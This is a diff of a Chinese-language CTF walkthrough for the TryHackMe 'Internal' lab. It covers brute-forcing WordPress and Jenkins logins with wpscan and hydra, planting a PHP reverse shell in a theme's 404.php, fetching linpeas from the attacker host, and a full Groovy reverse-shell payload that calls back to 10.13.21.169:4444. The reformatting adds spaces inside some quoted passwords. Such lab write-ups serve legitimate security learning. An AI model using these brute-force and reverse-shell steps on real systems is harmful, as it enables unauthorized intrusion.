@@ -1,7 +1,7 @@
-#服务枚举
+# 服务枚举
 ```
 ┌──(root💀kali)-[~]
-└─# nmap -sV -A 10.10.86.39                                                                                                                                                                                                          130 ⨯
+└─#  nmap -sV -A 10.10.86.39                                                                                                                                                                                                          130 ⨯
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 04:02 EDT
 Nmap scan report for internal.thm (10.10.86.39)
 Host is up (0.30s latency).
@@ -31,14 +31,14 @@ Nmap done: 1 IP address (1 host up) scanned in 89.21 seconds
 
 ```
 
-#把internal.thm添加进/etc/hosts
+# 把internal.thm添加进/etc/hosts
 ```echo "10.10.86.39 internal.thm" >> /etc/hosts```
 
 
-#目录爆破
+# 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u http://10.10.86.39 -e* -t 50 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
+└─#  python3 dirsearch.py -u http://10.10.86.39 -e* -t 50 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -59,10 +59,10 @@ Target: http://10.10.86.39
 
 ```
 
-#wordpress枚举,版本5.4.2，其他好像没什么特别有用的信息
+# wordpress枚举,版本5.4.2，其他好像没什么特别有用的信息
 ```
 ──(root💀kali)-[~]
-└─# wpscan --url http://10.10.86.39/wordpress/                                                                                                                                                                                         1 ⨯
+└─#  wpscan --url http://10.10.86.39/wordpress/                                                                                                                                                                                         1 ⨯
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -142,13 +142,13 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:22
 ```
 
-#验证wordpress用户，浏览器输入：http://internal.thm/blog/?author=1，证明存在用户admin
+# 验证wordpress用户，浏览器输入：http://internal.thm/blog/?author=1，证明存在用户admin
 ```
 显示 Author: admin
 ```
 
 
-#用wpscan爆破admin密码
+# 用wpscan爆破admin密码
 ```
 wpscan --url http://10.10.86.39/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt 
 
@@ -169,37 +169,37 @@ Trying admin / ionela Time: 00:09:01 <                                          
 ```
 
 
-#登录wordpress admin:my2boys,收集到一个邮箱地址：admin@internal.thm
+# 登录wordpress admin:my2boys,收集到一个邮箱地址：admin@internal.thm
 
 
-#在后台找到post留言，留下一对账号密码
+# 在后台找到post留言，留下一对账号密码
 ```
 Don't forget to reset Will's credentials. william:arnold147
 ```
 
-#在后台页面 Appearace->Theme Editer可以编辑在使用皮肤里面的php代码，我们选择404.php这个文件，上传一个反弹shell
+# 在后台页面 Appearace->Theme Editer可以编辑在使用皮肤里面的php代码，我们选择404.php这个文件，上传一个反弹shell
 使用这个payload ```https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php```
 把代码复制到404.php,修改反弹主机信息
 在前台页面随便输入一个不存在的页面，触发反弹shell    -->http://internal.thm/blog/index.php/2020/09/
 
 
-#上传pe到靶机
+# 上传pe到靶机
 wget http://10.13.21.169:8000/linpeas.sh
 
-#数据库密码,可通过phpmyadmin登录
+# 数据库密码,可通过phpmyadmin登录
 wordpress:wordpress123
 
 phpmyadmin:B2Ud4fEOZmVq
 
 
-#发现用户名：aubreanna，密码是？
+# 发现用户名：aubreanna，密码是？
 
 
-#ssh 爆破 ，失败，貌似不允许爆破
+# ssh 爆破 ，失败，貌似不允许爆破
 hydra -l aubreanna -P /usr/share/wordlists/rockyou.txt 10.10.86.39 ssh  -v -f
 
 
-#在/opt/wp-save.txt找到aubreanna密码
+# 在/opt/wp-save.txt找到aubreanna密码
 ```
 $ cat /opt/wp-save.txt
 cat wp-save.txt
@@ -207,23 +207,23 @@ Bill,
 
 Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
 
-aubreanna:bubb13guM!@#123
+aubreanna:bubb13guM!@# 123
 ```
 
 
-#根据登录信息 aubreanna:bubb13guM!@#123 找到user.txt
+# 根据登录信息 aubreanna:bubb13guM!@# 123 找到user.txt
 ```
 aubreanna@internal:~$ cat user.txt 
 THM{int3rna1_fl4g_1}
 ```
 
-#用户目录下另一个文件，提示在172网络运行了一个Jenkins的软件
+# 用户目录下另一个文件，提示在172网络运行了一个Jenkins的软件
 ```
 aubreanna@internal:~$ cat jenkins.txt
 Internal Jenkins service is running on 172.17.0.2:8080
 ```
 
-#在靶机用ifconfig查看当前网络,发现靶机里运行了一个docker
+# 在靶机用ifconfig查看当前网络,发现靶机里运行了一个docker
 ```
 aubreanna@internal:~$ ifconfig
 docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
@@ -263,17 +263,17 @@ veth930b0c5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 ```
 
 
-#我们本地用ssh转发，以便访问靶机里面的docker程序，
+# 我们本地用ssh转发，以便访问靶机里面的docker程序，
 
 ssh -L 6767:172.17.0.2:8080 aubreanna@internal.thm
 
-#本地用http://localhost:6767访问，发现跑了一个Jenkins程序
+# 本地用http://localhost:6767访问，发现跑了一个Jenkins程序
 Jenkins是一款由Java编写的开源的持续集成工具，其本身具有执行脚本的功能
 
-#通过搜索我们知道Jenkins的默认账号是：admin,利用hydra爆破
+# 通过搜索我们知道Jenkins的默认账号是：admin,利用hydra爆破
 ```
 ┌──(root💀kali)-[~]
-└─# hydra -l admin -P  /usr/share/wordlists/rockyou.txt -s 6767 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2f&Submit=Sign+in&Login=Login:Invalid username or password'
+└─#  hydra -l admin -P  /usr/share/wordlists/rockyou.txt -s 6767 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2f&Submit=Sign+in&Login=Login:Invalid username or password'
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-14 05:22:15
@@ -285,7 +285,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-14 05:22:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-14 05:23:17
 ```
 
-#登录凭证 admin:spongebob,去到"manage jekins->script console",提示可以自定义编写一种叫Groovy script 的脚本，谷歌搜索一下这个脚本语言的Reverse Shell，使用下面的payload,同时本地开启4444端口监听
+# 登录凭证 admin:spongebob,去到"manage jekins->script console",提示可以自定义编写一种叫Groovy script 的脚本，谷歌搜索一下这个脚本语言的Reverse Shell，使用下面的payload,同时本地开启4444端口监听
 
 ```
 String host="10.13.21.169";
@@ -294,7 +294,7 @@ String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-#登录进去以后同样在/opt文件夹找到note.txt文件
+# 登录进去以后同样在/opt文件夹找到note.txt文件
 ```
 $ cat note.txt
 cat note.txt
@@ -303,18 +303,18 @@ Aubreanna,
 Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
 need access to the root user account.
 
-root:tr0ub13guM!@#123
+root:tr0ub13guM!@# 123
 ```
 
-#回到靶机环境用上面凭证登录，拿到root flag
+# 回到靶机环境用上面凭证登录，拿到root flag
 ```
 aubreanna@internal:~$ su root
 Password: 
-root@internal:/home/aubreanna# cat /root/root.txt 
+root@internal:/home/aubreanna#  cat /root/root.txt 
 THM{d0ck3r_d3str0y3r}
-root@internal:/home/aubreanna# 
+root@internal:/home/aubreanna#  
 ```
 
-#总结
+# 总结
 这个靶机网站标记难度是hard，我在头两天毫无头绪，后面也不得不参考了网上的walkthough，为什么两次关键的提权都是在/opt/这个文件夹里，思路应该是全局搜索所有带关键字的文件，比如说aubreanna或者root，不过低权限会生成很多无用的信息，一个思路是重定向到一个文件，然后全局再搜索。查了一下官方writeup,房间作者是想考察渗透人员的手动枚举能力，所以敏感文件故意去掉了passwd等字样，因此linpease是枚举不了这些文件的
 学习了用ssh重定向docker里面的环境。
